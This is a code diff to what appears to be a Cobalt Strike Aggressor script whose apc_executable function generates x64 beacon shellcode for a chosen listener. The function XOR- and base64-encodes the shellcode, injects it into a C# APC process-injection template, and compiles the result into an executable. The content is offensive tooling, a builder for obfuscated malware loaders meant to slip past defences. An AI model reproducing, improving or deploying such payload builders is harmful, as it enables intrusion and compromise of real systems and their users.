@@ -37,53 +37,47 @@ sub compile {
 sub apc_executable {
 	# Set variables
 	global('$version $outputformat $file');
-	local('%options $listener $rawshellcode $shellcode $apc $newapc $handle $apcoutfile');
+	local('%options $listener $rawshellcode $b64shellcode $apc $newapc $handle $apcoutfile $file $b64 $test');
 	%options = $3;		
 	$version = iff(%options["dotnet35"] eq "true", "net35", "net40");
 	$listener = %options["listener"];
 	$outputformat = %options["output"];
-	elog(script_resource());
-	
+	$file = script_resource("executable_templates/UrbanBishop/Program.cs");
+
 	# Generate shellcode and base64 it
 	$rawshellcode  = artifact_payload($listener, "raw", "x64");
-	$shellcode = base64_encode($rawshellcode);
+	$b64shellcode = base64_encode($rawshellcode);
+	
+	$test = encode($rawshellcode, "xor", "x64");
+	$b64 = base64_encode($test);
 		
-	# Replace junk with shellcode
-	$handle = openf(script_resource("/executable_templates/APC_TEMPLATE.cs"));
+	# Read template and replace junk with shellcode
+	$handle = openf("$file");
 	$apc = readb($handle, -1);
+	$newapc = strrep($apc, 'REPLACETHISWITHSHELLCODE', $b64);
 	closef($handle);
-	$newapc = strrep($apc, 'REPLACETHISWITHSHELLCODE', $shellcode);
 
 	# Write the new .cs file to disk
-	$apcoutfile = script_resource("/executable_temps/APC.cs");
-	$handle = openf("> $apcoutfile");
+	$handle = openf(">$file");
     writeb($handle, $newapc);
-    closef($handle);
-
+	closef($handle);
+    
 	# Prompt for save location and compile
 	prompt_file_save($null, {
 		loca('$outfile');
-		$outfile = compile(script_resource("/executable_temps/APC.cs"), $outputformat, $version, $1 );
+		$outfile = compile($file, $outputformat, $version, $1 );
 		if($outfile eq "")
 		{
 			show_message("Compiling failed");
-			while (-exists script_resource("/executable_temps/APC.cs")
-			{
-				sleep(100);
-				deleteFile($outfile);
-			}
-			return;
 		}
 		else{
 			show_message("Compiling successful");
-			while (-exists script_resource("/executable_temps/APC.cs")
-			{
-				sleep(100);
-				deleteFile(script_resource("/executable_temps/APC.cs");
-			}
-			return;
 		}
 	});
+	# Restore Template file
+	$handle = openf(">$file");
+	writeb($handle, $apc);
+	closef($handle);
 }
 
 
